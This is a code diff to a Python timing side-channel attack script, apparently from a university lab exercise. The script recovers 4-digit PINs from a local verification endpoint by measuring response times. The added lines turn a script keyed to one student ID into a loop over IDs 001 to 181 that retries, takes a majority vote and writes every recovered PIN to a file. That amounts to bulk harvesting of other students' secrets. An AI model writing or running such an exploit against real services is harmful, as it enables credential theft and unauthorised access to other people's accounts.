@@ -3,6 +3,7 @@ import time
 import requests
 import matplotlib.pyplot as plt
 import os
+from collections import Counter
 
 # Target configuration
 URL = "http://127.0.0.1:5000/verify"
@@ -13,7 +14,6 @@ HEADERS = {"X-Student-ID": STUDENT_ID, "Content-Type": "application/json"}
 PIN_LENGTH = 4
 SAMPLES_PER_GUESS = 5  # Number of samples per digit to average out noise
 DIGITS = "0123456789"
-COLLECT_ALL_DATA = True
 
 
 def measure_response_time(candidate_pin: str) -> float:
@@ -96,8 +96,8 @@ def plot_timings(position, timings, known_prefix=""):
   sample_str += str(SAMPLES_PER_GUESS)
   # print(sample_str)
   
-  os.makedirs('results', exist_ok=True)
-  figname = f'results/{sample_str}_position_{position+1}_timing_diagram.png'
+  os.makedirs('tests', exist_ok=True)
+  figname = f'tests/{sample_str}_position_{position+1}_timing_diagram.png'
   plt.savefig(
     figname
   )
@@ -105,7 +105,11 @@ def plot_timings(position, timings, known_prefix=""):
 
   plt.close()
 
-def recover_secret_pin():
+def recover_secret_pin(student_id = "032"):
+  global STUDENT_ID
+  STUDENT_ID = student_id
+  HEADERS["X-Student-ID"] = student_id
+
   print("=" * 60)
   print(f" Starting Timing Attack Exploit against {URL}")
   print(f" Target Student ID : {STUDENT_ID}")
@@ -154,9 +158,8 @@ def recover_secret_pin():
     print(f"[+] Prefix so far: '{known_prefix}'.")
     if found_pin:
       print(f"[+] HTTP 200 OK detected at candidate: '{correct_candidate}'")
-      if not COLLECT_ALL_DATA:
-        known_prefix = correct_candidate
-        break
+      known_prefix = correct_candidate
+      break
     print("-" * 60 + "\n")
 
 
@@ -169,7 +172,26 @@ def recover_secret_pin():
     print("=" * 60)
   else:
     print("\n[-] Failed to verify recovered PIN. Consider increasing SAMPLES_PER_GUESS.")
-
+  return known_prefix, is_success
 
 if __name__ == "__main__":
-  recover_secret_pin()
+  with open("all_pins.txt", "w") as f:
+    for i in range(1, 182):
+      student_id = "{:03d}".format(i)
+      print(f"[*] Recovering PIN for Student ID: {student_id}")
+      recovered_pins = []
+      best_pin = None
+
+      for j in range(10):
+        known_prefix, is_success = recover_secret_pin(student_id)
+        recovered_pins.append(known_prefix)
+        if is_success:
+          best_pin = known_prefix
+          break
+
+      if not best_pin and recovered_pins:
+        best_pin = Counter(recovered_pins).most_common(1)[0][0]
+
+      print(f"[===>] Best PIN for Student ID {student_id}: {best_pin}")
+      f.write(f"{student_id}: {best_pin}\n")
+      f.flush()
